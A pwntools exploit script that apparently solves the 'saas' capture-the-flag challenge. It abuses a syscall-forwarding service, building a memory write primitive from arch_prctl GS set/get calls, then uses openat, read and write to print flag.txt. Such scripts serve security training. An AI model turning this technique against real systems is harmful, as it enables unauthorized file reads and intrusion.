#!/usr/bin/env python3
from pwn import *
from struct import *

# From linux/arch/x86/include/uapi/asm/prctl.h
ARCH_SET_GS = 0x1001
ARCH_GET_GS = 0x1004

AT_FDCWD = 0xffffff9c

context.binary = './saas'

r = process("./saas")
# r = remote("jh2i.com", 50016)

r.recvline()
r.recvline()

def g(rax=0, rdi=0, rsi=0, rdx=0, r10=0, r9=0, r8=0):
    r.sendline(str(rax))
    r.sendline(str(rdi))
    r.sendline(str(rsi))
    r.sendline(str(rdx))
    r.sendline(str(r10))
    r.sendline(str(r9))
    r.sendline(str(r8))

def ret():
    res = r.recvline().decode().strip().split("Rax: ", 1)[-1]
    (r.recvline())
    retval = int(res[2:], 16)
    log.info("retval: " + hex(retval))
    return retval

def write32(addr, value):
    retval = g(158, ARCH_SET_GS, value) # arch_prctl(ARCH_SET_GS, value)
    assert 0 == ret()
    retval = g(158, ARCH_GET_GS, addr) # arch_prctl(ARCH_GET_GS, addr)
    assert 0 == ret()


g(12, 0) # heap = brk(0)
heap = ret()
log.info("Heap is at " + hex(heap))

# Extend heap
log.info("Extending heap")
g(12, heap + 0x10000) # brk(heap + 0x1000)
assert ret() == heap + 0x10000

log.info("Writing flag.txt to heap")
write32(heap, unpack("<l", b"flag")[0])
write32(heap + 4, unpack("<l", b".txt")[0])
write32(heap + 8, 0)

g(257, AT_FDCWD, heap) # fd = openat(AT_FDCWD, "flag.txt", O_RDONLY)
fd = ret()
assert fd != 0xffffffffffffffff
log.info("Opened flag.txt with fd = " + hex(fd))

g(0, fd, heap, 0xFF) # read(fd, heap, 0xFF)
ret()

g(1, 1, heap, 0xFF) # write(STDOUT_FILENO, heap, 0xFF)
buf = r.recvline()
leak = buf[145:]
log.info("flag: " + str(leak))
